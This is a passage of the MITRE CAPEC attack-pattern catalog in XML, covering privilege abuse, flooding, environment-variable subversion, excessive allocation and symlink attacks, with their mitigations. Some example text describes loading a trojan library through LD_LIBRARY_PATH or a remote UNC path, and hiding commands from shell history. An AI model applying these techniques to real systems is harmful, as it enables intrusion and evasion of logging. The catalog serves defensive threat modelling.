         <ns0:Skills_Required>
            <ns0:Skill Level="Low">Adversary can leverage privileged features they already have access to without additional effort or skill. Adversary is only required to have access to an account with improper priveleges.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack. The ability to access the target is required.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Configure account privileges such privileged/administrator functionality is not exposed to non-privileged/lower accounts.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Improperly configured account privileges allowed unauthorized users on a hospital's network to access the medical records for over 3,000 patients. Thus compromising data integrity and confidentiality in addition to HIPAA violations.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="269" />
            <ns0:Related_Weakness CWE_ID="732" />
            <ns0:Related_Weakness CWE_ID="1317" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1548</ns0:Entry_ID>
               <ns0:Entry_Name>Abuse Elevation Control Mechanism</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences, Example_Instances, Likelihood_Of_Attack, Mitigations, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="125" Name="Flooding" Abstraction="Meta" Status="Stable">
         <ns0:Description>An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Any target that services requests is vulnerable to this attack on some level of scale.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>A successful flooding attack compromises the availability of the target system's service by exhausting its available resources.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Ensure that protocols have specific limits of scale configured.</ns0:Mitigation>
            <ns0:Mitigation>Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.</ns0:Mitigation>
            <ns0:Mitigation>Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="404" />
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1498.001</ns0:Entry_ID>
               <ns0:Entry_Name>Network Denial of Service: Direct Network Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>10</ns0:Entry_ID>
               <ns0:Entry_Name>Denial of Service</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Traffic flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="13" Name="Subverting Environment Variable Values" Abstraction="Detailed" Status="Stable">
         <ns0:Description>The adversary directly or indirectly modifies environment variables used by or controlling the target software. The adversary's goal is to cause the target software to deviate from its expected operation in a manner that benefits the adversary.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="77" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="14" />
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="10" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on. Most importantly, the adversary tries to determine what environment variables might be used by the underlying software, or even the application itself.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find user-controlled environment variables] Using the information found by probing the application, the adversary attempts to manipulate any user-controlled environment variables they have found are being used by the application, or suspect are being used by the application, and observe the effects of these changes. If the adversary notices any significant changes to the application, they will know that a certain environment variable is important to the application behavior and indicates a possible attack vector.</ns0:Description>
               <ns0:Technique>Alter known environment variables such as "$PATH", "$HOSTNAME", or "LD_LIBRARY_PATH" and see if application behavior changes.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Manipulate user-controlled environment variables] The adversary manipulates the found environment variable(s) to abuse the normal flow of processes or to gain access to privileged resources.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An environment variable is accessible to the user.</ns0:Prerequisite>
            <ns0:Prerequisite>An environment variable used by the application can be tainted with user supplied data.</ns0:Prerequisite>
            <ns0:Prerequisite>Input data used in an environment variable is not validated properly.</ns0:Prerequisite>
            <ns0:Prerequisite>The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an adversary may attempt to manipulate that variable.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">In a web based scenario, the client controls the data that it submitted to the server. So anybody can try to send malicious data and try to bypass the authentication mechanism.</ns0:Skill>
            <ns0:Skill Level="High">Some more advanced attacks may require knowledge about protocols and probing technique which help controlling a variable. The malicious user may try to understand the authentication mechanism in order to defeat it.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Accountability</ns0:Scope>
               <ns0:Impact>Hide Activities</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Protect environment variables against unauthorized read and write access.</ns0:Mitigation>
            <ns0:Mitigation>Protect the configuration files which contain environment variables against illegitimate read and write access.</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.</ns0:Mitigation>
            <ns0:Mitigation>Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the adversary upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as \\172.16.2.100\shared_files\trojan_dll.dll. See also: Path Manipulation (CVE-1999-0073)</ns0:Example>
            <ns0:Example>The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to "ignorespace". HISTCONTROL can also be set to ignore duplicate commands by setting it to "ignoredups". In some Linux systems, this is set by default to "ignoreboth" which covers both of the previous examples. This means that " ls" will not be saved, but "ls" would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="353" />
            <ns0:Related_Weakness CWE_ID="285" />
            <ns0:Related_Weakness CWE_ID="302" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="15" />
            <ns0:Related_Weakness CWE_ID="73" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="200" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1562.003</ns0:Entry_ID>
               <ns0:Entry_Name>Impair Defenses:Impair Command History Logging</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1574.006</ns0:Entry_ID>
               <ns0:Entry_Name>Hijack Execution Flow:Dynamic Linker Hijacking</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1574.007</ns0:Entry_ID>
               <ns0:Entry_Name>Hijack Execution Flow:Path Interception by PATH Environment Variable</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Examples-Instances, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences, Mitigations, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Execution_Flow, Prerequisites</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="130" Name="Excessive Allocation" Abstraction="Meta" Status="Stable">
         <ns0:Description>An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>A successful excessive allocation attack forces the target system to exhaust its resources, thereby compromising the availability of its service.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Limit the amount of resources that are accessible to unprivileged users.</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Consider all potentially relevant properties when validating input.</ns0:Mitigation>
            <ns0:Mitigation>Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</ns0:Mitigation>
            <ns0:Mitigation>Use resource-limiting settings, if possible.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="404" />
            <ns0:Related_Weakness CWE_ID="770" />
            <ns0:Related_Weakness CWE_ID="1325" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499.003</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service:Application Exhaustion Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>10</ns0:Entry_ID>
               <ns0:Entry_Name>Denial of Service</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="132" Name="Symlink Attack" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>The endpoint file may be either output or input. If the file is output, the result is that the endpoint is modified, instead of a file at the intended location. Modifications to the endpoint file may include appending, overwriting, corrupting, changing permissions, or other modifications.</html:p>
            <html:p>In some variants of this attack the adversary may be able to control the change to a file while in other cases they cannot. The former is especially damaging since the adversary may be able to grant themselves increased privileges or insert false information, but the latter can also be damaging as it can expose sensitive information or corrupt or destroy vital system or application files. Alternatively, the endpoint file may serve as input to the targeted application. This can be used to feed malformed input into the target or to cause the target to process different information, possibly allowing the adversary to control the actions of the target or to cause the target to expose information to the adversary. Moreover, the actions taken on the endpoint file are undertaken with the permissions of the targeted user or application, which may exceed the permissions that the adversary would normally have.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="159" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify Target] Adversary identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.</ns0:Description>
               <ns0:Technique>The adversary writes to files in different directories to check whether the application has sufficient checking before file operations.</ns0:Technique>
               <ns0:Technique>The adversary creates symlinks to files in different directories.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Try to create symlinks to different files] The adversary then uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.</ns0:Description>
               <ns0:Technique>The adversary monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the adversary can delay the operations by using "sleep(2)" and "usleep()" to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.</ns0:Technique>
               <ns0:Technique>The adversary may need a little guesswork on the filenames on which the target application would operate.</ns0:Technique>
               <ns0:Technique>The adversary tries to create symlinks to the various filenames.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Target application operates on created symlinks to sensitive files] The adversary is able to create symlinks to sensitive files while the target application is operating on the file.</ns0:Description>
               <ns0:Technique>Create the symlink to the sensitive file such as configuration files, etc.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The targeted application must perform the desired activities on a file without checking whether the file is a symbolic link or not. The adversary must be able to predict the name of the file the target application is modifying and be able to create a new symbolic link where that file would appear.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To create symlinks</ns0:Skill>
            <ns0:Skill Level="High">To identify the files and create the symlinks during the file operation time window</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack. The only requirement is the ability to create the necessary symbolic link.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Other</ns0:Impact>
               <ns0:Note>Information Leakage</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Accountability</ns0:Scope>
               <ns0:Scope>Authentication</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Scope>Non-Repudiation</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Check for the existence of files to be created, if in existence verify they are neither symlinks nor hard links before opening them.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Use randomly generated file names for temporary files. Give the files restrictive permissions.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>The adversary creates a symlink with the "same" name as the file which the application is intending to write to. The application will write to the file- "causing the data to be written where the symlink is pointing". An attack like this can be demonstrated as follows:</html:p>
